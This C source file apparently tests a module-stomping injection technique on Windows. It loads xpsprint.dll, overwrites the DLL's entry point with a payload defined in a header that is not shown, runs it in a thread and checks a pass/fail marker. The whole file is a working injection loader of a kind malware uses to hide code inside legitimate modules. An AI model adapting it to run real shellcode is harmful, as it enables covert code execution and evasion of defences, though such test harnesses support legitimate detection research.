#include <windows.h>
#include "../common/c1_marker.h"
#include "../common/c1_return_payload.h"

int main(void) {
    HMODULE module = LoadLibraryExA("xpsprint.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!module) return 1;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew < 0) return 1;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 1;

    DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    BOOL fits = FALSE;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        SIZE_T size = section->Misc.VirtualSize ? section->Misc.VirtualSize : section->SizeOfRawData;
        if (ep_rva >= section->VirtualAddress && ep_rva - section->VirtualAddress <= size &&
            payload_len <= size - (ep_rva - section->VirtualAddress)) {
            fits = TRUE;
            break;
        }
    }
    if (!fits) {
        FreeLibrary(module);
        return 1;
    }

    void* entry_point = (BYTE*)module + ep_rva;
    DWORD previous = 0;
    if (!VirtualProtect(entry_point, payload_len, PAGE_EXECUTE_READWRITE, &previous)) {
        FreeLibrary(module);
        return 1;
    }

    c1_reset_marker();
    memcpy(entry_point, payload, payload_len);
    FlushInstructionCache(GetCurrentProcess(), entry_point, payload_len);
    DWORD ignored = 0;
    if (!VirtualProtect(entry_point, payload_len, previous, &ignored)) {
        FreeLibrary(module);
        return 1;
    }

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry_point, NULL, 0, NULL);
    if (!thread) {
        FreeLibrary(module);
        return 1;
    }
    if (WaitForSingleObject(thread, 5000) != WAIT_OBJECT_0) {
        CloseHandle(thread);
        FreeLibrary(module);
        return 1;
    }
    CloseHandle(thread);
    BOOL passed = c1_write_marker() && c1_marker_passed();
    FreeLibrary(module);
    return passed ? 0 : 1;
}
